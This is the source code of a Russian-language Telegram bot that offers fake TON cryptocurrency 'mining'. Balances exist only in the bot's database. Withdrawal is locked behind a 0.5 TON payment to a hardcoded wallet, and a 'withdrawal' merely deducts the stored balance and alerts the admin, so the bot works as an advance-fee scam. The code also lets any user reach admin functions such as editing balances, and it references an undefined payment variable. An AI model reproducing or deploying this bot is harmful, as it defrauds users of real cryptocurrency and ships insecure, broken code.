const TelegramBot = require('node-telegram-bot-api');
const db = require('./database');
const ton = require('./ton');
require('dotenv').config();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = 2109063524;
const PAYMENT_ADDRESS = 'UQD8DLY30eWms-ff-YvfH-LyhrF8Ja3oSR2Imt1I51RKrwio';
const CHANNELS = [
    '@TonKoinMining',
    '@TONClassic_Airdrop',
    '@jsprojectsSell'
];
const adminState = {};

// Обработка реферальных ссылок
bot.onText(/\/start ref_(\d+)/, async (msg, match) => {
    const userId = msg.from.id;
    const inviterId = parseInt(match[1]);
    
    if (inviterId !== userId) {
        await db.addReferral(inviterId, userId);
        bot.sendMessage(inviterId, `🎉 Новый реферал присоединился по вашей ссылке: @${msg.from.username}`);
    }
    
    handleStart(msg);
});

bot.onText(/\/start/, handleStart);

async function handleStart(msg) {
    const userId = msg.from.id;
    let user = await db.getUser(userId);
    
    if (!user) {
        user = {
            id: userId,
            username: msg.from.username || '',
            balance: 0,
            miningBalance: 0,
            miningRate: 0.0000001000,
            upgraded: false,
            miningActive: false,
            tasksCompleted: [],
            lastMiningUpdate: Date.now()
        };
        await db.saveUser(user);
    }

    const keyboard = {
        reply_markup: {
            keyboard: [
                ['🔄 Майнинг', '👥 Партнеры'],
                ['📝 Задания', '💰 Баланс']
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(userId, 'Держи меню 👇', keyboard);
}

// Обработка кнопок
bot.on('message', async (msg) => {
    if (!msg.text) return;
    const userId = msg.from.id;
    const user = await db.getUser(userId);
    if (!user) return;

// Обработка административных действий
    if (adminState[userId] && adminState[userId].action) {
        const { targetUserId, action } = adminState[userId];
        
        switch(action) {
            case 'edit_balance':
                const newBalance = parseFloat(msg.text);
                if (isNaN(newBalance)) {
                    return bot.sendMessage(userId, '❌ Неверная сумма. Введите число.');
                }
                
                await db.updateUser(targetUserId, (u) => {
                    u.balance = newBalance;
                });
                bot.sendMessage(userId, `✅ Баланс пользователя ${targetUserId} изменен на ${newBalance} TON`);
                delete adminState[userId];
                return;
                
            case 'edit_mining_rate':
                const newRate = parseFloat(msg.text);
                if (isNaN(newRate)) {
                    return bot.sendMessage(userId, '❌ Неверное значение. Введите число.');
                }
                
                await db.updateUser(targetUserId, (u) => {
                    u.miningRate = newRate;
                });
                bot.sendMessage(userId, `✅ Скорость майнинга пользователя ${targetUserId} изменена на ${newRate} TON/сек`);
                delete adminState[userId];
                return;
        }
    }

    switch (msg.text) {
        case '👥 Партнеры':
            const refCount = await db.getReferralsCount(userId);
            const refLink = `https://t.me/${(await bot.getMe()).username}?start=ref_${userId}`;
            bot.sendMessage(
                userId,
                `👥 Партнерская программа:\n\n` +
                `• За каждого друга: 0.005 TON\n` +
                `• 5% от дохода реферала\n` +
                `• Рефералов: ${refCount}\n\n` +
                `Ваша ссылка:\n<code>${refLink}</code>`,
                { parse_mode: 'HTML' }
            );
            break;

        case '🔄 Майнинг':
            if (!user.miningActive) {
                const subscribed = await checkSubscriptions(userId);
                if (subscribed) {
                    await db.updateUser(userId, (u) => {
                        u.miningActive = true;
                        u.lastMiningUpdate = Date.now();
                    });
                    bot.sendMessage(userId, '✅ Майнинг начат!');
                } else {
                    const channelList = CHANNELS.map(c => `• <a href="https://t.me/${c.replace('@', '')}">${c}</a>`).join('\n');
                    bot.sendMessage(
                        userId,
                        `❌ Для начала майнинга подпишитесь на наши каналы:\n\n${channelList}`,
                        { parse_mode: 'HTML' }
                    );
                }
            } else {
                await updateMiningBalance(userId);
                const updatedUser = await db.getUser(userId);
                
                const keyboard = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💵 Собрать', callback_data: 'collect' }],
                            [{ text: '⚡ Улучшить майнинг', callback_data: 'upgrade' }]
                        ]
                    }
                };
                
                bot.sendMessage(
                    userId,
                    `⛏️ Майнинг активен!\n` +
                    `Баланс: ${updatedUser.miningBalance.toFixed(10)} TON\n` +
                    `Скорость: ${updatedUser.miningRate.toFixed(10)} TON/5 сек`,
                    keyboard
                );
            }
            break;

        case '📝 Задания':
            await handleTasks(userId);
            break;

        case '💰 Баланс':
            await updateMiningBalance(userId);
            const updatedUser = await db.getUser(userId);
            
            const balanceMsg = `👤 Ваш профиль:\n\n` +
                `ID: <code>${userId}</code>\n` +
                `Username: @${updatedUser.username}\n` +
                `Баланс: ${updatedUser.balance.toFixed(6)} TON\n\n` +
                `Майнинг: ${updatedUser.miningBalance.toFixed(6)} TON`;

            const keyboard = {
                reply_markup: {
                    inline_keyboard: [[{ 
                        text: '💸 Вывести', 
                        callback_data: 'withdraw' 
                    }]]
                }
            };
            bot.sendMessage(userId, balanceMsg, { parse_mode: 'HTML', ...keyboard });
            break;
    }
});


// Колбэки для инлайн-кнопок
bot.on('callback_query', async (query) => {
    const userId = query.from.id;
    const user = await db.getUser(userId);
    if (!user) return;

    const data = query.data;

    if (data === 'collect') {
        await updateMiningBalance(userId);
        const updatedUser = await db.getUser(userId);
        
        if (updatedUser.miningBalance >= 0.00001) {
            const collected = updatedUser.miningBalance;
            await db.updateUser(userId, (u) => {
                u.balance += collected;
                u.miningBalance = 0;
                u.lastMiningUpdate = Date.now();
            });
            
            bot.answerCallbackQuery(query.id, {
                text: `✅ Собрано ${collected.toFixed(6)} TON!`,
                show_alert: true
            });
            
            // Обновляем сообщение
            bot.editMessageText(
                `⛏️ Майнинг активен!\nБаланс: 0.0000000000 TON\nСкорость: ${updatedUser.miningRate.toFixed(10)} TON/5 сек`,
                {
                    chat_id: query.message.chat.id,
                    message_id: query.message.message_id
                }
            );
        } else {
            bot.answerCallbackQuery(query.id, {
                text: '❌ Минимум 0.00001 TON для сбора',
                show_alert: true
            });
        }
    } 
    else if (data === 'upgrade') {
        const message = `💳 Для улучшения майнинга:\n\n` +
            `Переведите 0.5 TON на адрес:\n` +
            `<code>${PAYMENT_ADDRESS}</code>\n\n` +
            `В комментарии напишите свой игровой ID !` +
            `⚠️ Без вашего ID средства не зачислятся!`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [[{ 
                    text: '✅ Я оплатил', 
                    callback_data: 'payment_done' 
                }]]
            }
        };
        
        bot.sendMessage(userId, message, { 
            parse_mode: 'HTML',
            ...keyboard,
            disable_web_page_preview: true
        });
    } 
     else if (data === 'payment_done') {
        bot.answerCallbackQuery(query.id, {
            text: '🕒 Проверяем платеж... Это займет до 15 минут',
            show_alert: true
        });
        
        // Запускаем проверку платежа
        setTimeout(async () => {
            const paymentVerified = await ton.checkPayment(PAYMENT_ADDRESS, 0.5, PAYMENT_COMMENT);
            if (paymentVerified) {
                await db.updateUser(userId, (u) => {
                    u.miningRate += 0.0001000000;
                    u.upgraded = true;
                });
                bot.sendMessage(userId, '✅ Платеж подтвержден! Скорость майнинга увеличена!');
            } else {
                bot.sendMessage(userId, '❌ Платеж не найден. Попробуйте позже или свяжитесь с поддержкой.');
            }
        }, 30000);
        
        // Запускаем проверку платежа
        checkPaymentWithRetry(userId, 10); // 10 попыток с интервалом 1 минута
    } 
    else if (data === 'withdraw') {
        if (user.balance >= 0.35) {
            if (user.upgraded) {
                bot.sendMessage(userId, '📝 Введите ваш адрес TON кошелька:');
                bot.once('message', async (msg) => {
                    const walletAddress = msg.text.trim();
                    
                    // Простая проверка адреса
                    if (!walletAddress.startsWith('UQ') || walletAddress.length < 48) {
                        return bot.sendMessage(userId, '❌ Неверный формат адреса. Используйте адрес в формате UQ...');
                    }
                    
                    bot.sendMessage(userId, `💳 Введите сумму для вывода (мин. 0.35 TON, максимум ${user.balance.toFixed(6)} TON):`);
                    bot.once('message', async (msg) => {
                        const amount = parseFloat(msg.text);
                        if (isNaN(amount)) {
                            return bot.sendMessage(userId, '❌ Неверная сумма. Введите число');
                        }
                        
                        if (amount < 0.35) {
                            return bot.sendMessage(userId, '❌ Минимальная сумма вывода 0.35 TON');
                        }
                        
                        if (amount > user.balance) {
                            return bot.sendMessage(userId, `❌ Недостаточно средств. Ваш баланс: ${user.balance.toFixed(6)} TON`);
                        }
                        
                        try {
                            bot.sendMessage(userId, '🔄 Обработка запроса...');
                            
                            await db.updateUser(userId, (u) => {
                                u.balance -= amount;
                            });
                    
                            
                            bot.sendMessage(userId, 
                                `✅ Запрос на вывод ${amount.toFixed(6)} TON принят!\n` +
                                `Средства поступят в течение 15 минут на адрес:\n` +
                                `<code>${walletAddress}</code>`,
                                { parse_mode: 'HTML' }
                            );
                            
                            // Уведомление админу
                            bot.sendMessage(ADMIN_ID, 
                                `⚠️ Новый запрос на вывод!\n` +
                                `Пользователь: @${user.username} (${user.id})\n` +
                                `Сумма: ${amount.toFixed(6)} TON\n` +
                                `Адрес: ${walletAddress}`
                            );
                        } catch (e) {
                            console.error('Withdrawal error:', e);
                            bot.sendMessage(userId, '❌ Ошибка при обработке вывода. Попробуйте позже.');
                        }
                    });
                });
            } else {
                bot.answerCallbackQuery(query.id, {
                    text: '❌ Для вывода необходимо улучшить майнинг!',
                    show_alert: true
                });
            }
        } else {
            bot.answerCallbackQuery(query.id, {
                text: `❌ Минимум 0.35 TON для вывода! Ваш баланс: ${user.balance.toFixed(6)} TON`,
                show_alert: true
            });
        }
    } 
    else if (data === 'next_task') {
        await handleTasks(userId);
    } 
    else if (data.startsWith('check_task_')) {
        const taskId = data.split('_')[2];
        await handleTaskVerification(userId, taskId, query);
    }
else if (data === 'add_task') {
    bot.sendMessage(userId, '✏️ Введите ссылку на Telegram канал для нового задания:');
    
    bot.once('message', async (msg) => {
        const link = msg.text.trim();
        
        if (!link.startsWith('https://t.me/') && !link.startsWith('@')) {
            return bot.sendMessage(userId, 
                '❌ Неверный формат ссылки. Используйте:\n' +
                '• https://t.me/username\n' +
                '• @username'
            );
        }
        
        let normalizedLink = link;
        if (link.startsWith('@')) {
            normalizedLink = `https://t.me/${link.substring(1)}`;
        }
        
        try {
            await bot.getChat(normalizedLink.replace('https://t.me/', '@'));
        } catch (e) {
            return bot.sendMessage(userId, 
                '❌ Не удалось найти канал. Проверьте правильность ссылки.'
            );
        }
        
        try {
            await db.addTask({
                id: Date.now().toString(),
                link: normalizedLink,
                reward: 0.0000001000
            });
            
            bot.sendMessage(userId, 
                `✅ Задание добавлено!\n` +
                `Канал: ${normalizedLink}\n\n` +
                `Пользователи получат +0.0000001000 TON/сек к скорости майнинга за подписку.`
            );
        } catch (e) {
            console.error('Error adding task:', e);
            bot.sendMessage(userId, '❌ Ошибка при добавлении задания. Попробуйте позже.');
        }
    });
}  
 
     else if (data === 'manage_users') {
    bot.sendMessage(userId, 'Введите ID пользователя:');
    bot.once('message', async (msg) => {
        const targetUserId = parseInt(msg.text);
        if (isNaN(targetUserId)) {
            return bot.sendMessage(userId, '❌ Неверный ID. Введите число.');
        }
        
        const targetUser = await db.getUser(targetUserId);
        if (!targetUser) {
            return bot.sendMessage(userId, '❌ Пользователь не найден.');
        }
        
        adminState[userId] = { targetUserId, action: 'user_management' };
        
        const userInfo = `
👤 Пользователь: 
ID: ${targetUser.id}
Username: @${targetUser.username || 'N/A'}
Баланс: ${targetUser.balance.toFixed(6)} TON
Скорость майнинга: ${targetUser.miningRate.toFixed(10)} TON/сек
Улучшен: ${targetUser.upgraded ? '✅' : '❌'}
        `;
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✏️ Изменить баланс', callback_data: 'edit_balance' }],
                    [{ text: '⚡ Изменить скорость', callback_data: 'edit_mining_rate' }],
                    [{ text: '🆙 Установить улучшение', callback_data: 'set_upgraded' }],
                    [{ text: '🔙 Назад', callback_data: 'admin_back' }]
                ]
            }
        };
        
        bot.sendMessage(userId, userInfo, keyboard);
    });
}

    else if (data === 'edit_balance') {
        const targetUserId = adminState[userId]?.targetUserId;
        if (!targetUserId) return;
        
        bot.sendMessage(userId, `Введите новый баланс для пользователя ${targetUserId}:`);
        adminState[userId] = { 
            ...adminState[userId], 
            action: 'edit_balance' 
        };
    }
    else if (data === 'edit_mining_rate') {
        const targetUserId = adminState[userId]?.targetUserId;
        if (!targetUserId) return;
        
        bot.sendMessage(userId, `Введите новую скорость майнинга для пользователя ${targetUserId}:`);
        adminState[userId] = { 
            ...adminState[userId], 
            action: 'edit_mining_rate' 
        };
    }
    else if (data === 'set_upgraded') {
        const targetUserId = adminState[userId]?.targetUserId;
        if (!targetUserId) return;
        
        await db.updateUser(targetUserId, (u) => {
            u.upgraded = true;
        });
        bot.sendMessage(userId, `✅ Пользователь ${targetUserId} получил улучшение!`);
        delete adminState[userId];
    }
    else if (data === 'admin_back') {
        delete adminState[userId];
        bot.sendMessage(userId, 'Действие отменено');
    }
});

// Проверка подписок на каналы
async function checkSubscriptions(userId) {
    for (const channel of CHANNELS) {
        try {
            const member = await bot.getChatMember(channel, userId);
            if (member.status !== 'member' && 
                member.status !== 'administrator' && 
                member.status !== 'creator') {
                return false;
            }
        } catch (e) {
            console.error(`Error checking channel ${channel}:`, e);
            // Если не удалось проверить, считаем что не подписан
            return false;
        }
    }
    return true;
}

// Обновление баланса майнинга
async function updateMiningBalance(userId) {
    const user = await db.getUser(userId);
    if (!user || !user.miningActive) return;
    
    const now = Date.now();
    const timeDiff = (now - user.lastMiningUpdate) / 1000; // в секундах
    const cycles = Math.floor(timeDiff / 5);
    
    if (cycles > 0) {
        const earned = cycles * user.miningRate;
        await db.updateUser(userId, (u) => {
            u.miningBalance += earned;
            u.lastMiningUpdate = now;
        });
    }
}

// Обработчик заданий
async function handleTasks(userId) {
    const user = await db.getUser(userId);
    const tasks = await db.getTasks();
    const availableTasks = tasks.filter(t => !user.tasksCompleted.includes(t.id));

    if (availableTasks.length === 0) {
        bot.sendMessage(userId, '📭 Задания закончились. Ждите обновлений!');
        return;
    }

    const task = availableTasks[0];
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔗 Перейти', url: task.link }],
                [
                    { text: '✅ Проверить', callback_data: `check_task_${task.id}` },
                    { text: '⏭ Следующее', callback_data: 'next_task' }
                ]
            ]
        }
    };
    
    bot.sendMessage(
        userId, 
        `📝 Задание:\n\nПодпишитесь на канал:\n${task.link}\n\nНаграда: +${task.reward.toFixed(10)} TON/сек к скорости майнинга`,
        { ...keyboard, disable_web_page_preview: true }
    );
}

// Проверка выполнения задания
// Проверка выполнения задания
async function handleTaskVerification(userId, taskId, query) {
    try {
        // Уведомляем пользователя о начале проверки
        await bot.answerCallbackQuery(query.id, { text: '⏳ Проверяем подписку...' });
        
        const user = await db.getUser(userId);
        if (!user) return;
        
        // Проверяем, не выполнено ли уже задание
        if (user.tasksCompleted.includes(taskId)) {
            await bot.answerCallbackQuery(query.id, {
                text: '❌ Вы уже выполнили это задание!',
                show_alert: true
            });
            return;
        }

        const tasks = await db.getTasks();
        const task = tasks.find(t => t.id === taskId);
        if (!task) {
            await bot.answerCallbackQuery(query.id, {
                text: '❌ Задание не найдено',
                show_alert: true
            });
            return;
        }
        
        const channelUsername = task.link.split('/').pop().replace('@', '');
        
        try {
            const member = await bot.getChatMember(`@${channelUsername}`, userId);
            if (['member', 'administrator', 'creator'].includes(member.status)) {
                // Обновляем пользователя
                await db.updateUser(userId, (u) => {
                    u.miningRate += task.reward;
                    u.tasksCompleted.push(taskId);
                });
                
                // Отключаем кнопки в сообщении
                await bot.editMessageReplyMarkup(
                    { inline_keyboard: [] },
                    {
                        chat_id: query.message.chat.id,
                        message_id: query.message.message_id
                    }
                );
                
                // Отправляем уведомление
                await bot.answerCallbackQuery(query.id, {
                    text: `✅ Вы получили +${task.reward.toFixed(10)} TON/сек!`,
                    show_alert: true
                });
                
                // Отправляем отдельное сообщение об успехе
                await bot.sendMessage(
                    userId, 
                    `🎉 Задание выполнено!\n` +
                    `Вы подписались на канал: ${task.link}\n` +
                    `Теперь ваша скорость майнинга: ${(user.miningRate + task.reward).toFixed(10)} TON/сек`
                );
            } else {
                await bot.answerCallbackQuery(query.id, {
                    text: '❌ Вы не подписаны на канал. Подпишитесь и попробуйте снова.',
                    show_alert: true
                });
            }
        } catch (e) {
            console.error('Task verification error:', e);
            await bot.answerCallbackQuery(query.id, {
                text: '❌ Ошибка при проверке подписки. Попробуйте позже.',
                show_alert: true
            });
        }
    } catch (e) {
        console.error('Error in task verification:', e);
        await bot.answerCallbackQuery(query.id, {
            text: '❌ Произошла ошибка. Попробуйте позже.',
            show_alert: true
        });
    }
}

// Админ-панель
bot.onText(/\/panel/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📊 Статистика', callback_data: 'stats' }],
                [{ text: '➕ Добавить задание', callback_data: 'add_task' }],
                [{ text: '👤 Управление пользователями', callback_data: 'manage_users' }]
            ]
        }
    };
    
    bot.sendMessage(msg.from.id, '👑 Админ-панель:', keyboard);
});

// Периодическая проверка платежей
async function checkPaymentWithRetry(userId, attempts) {
    if (attempts <= 0) {
        bot.sendMessage(userId, '❌ Платеж не найден. Попробуйте позже или свяжитесь с поддержкой.');
        return;
    }
    
    try {
        const paymentVerified = await ton.checkPayment(PAYMENT_ADDRESS, 0.5, PAYMENT_COMMENT);
        if (paymentVerified) {
            await db.updateUser(userId, (u) => {
                u.miningRate += 0.0001000000;
                u.upgraded = true;
            });
            bot.sendMessage(userId, '✅ Платеж подтвержден! Скорость майнинга увеличена!');
            return;
        }
    } catch (e) {
        console.error('Payment check error:', e);
    }
    
    // Повторная проверка через 1 минуту
    setTimeout(() => {
        checkPaymentWithRetry(userId, attempts - 1);
    }, 60000);
}

// Запуск майнинг-таймера
setInterval(async () => {
    try {
        const users = await db.getAllUsers();
        const now = Date.now();
        
        for (const user of users) {
            if (user.miningActive) {
                const timeDiff = (now - user.lastMiningUpdate) / 1000;
                const cycles = Math.floor(timeDiff / 5);
                
                if (cycles > 0) {
                    const earned = cycles * user.miningRate;
                    await db.updateUser(user.id, (u) => {
                        u.miningBalance += earned;
                        u.lastMiningUpdate = now;
                    });
                }
            }
        }
    } catch (e) {
        console.error('Mining interval error:', e);
    }
}, 30000); // Проверка каждые 30 секунд

console.log('🤖 Бот запущен!');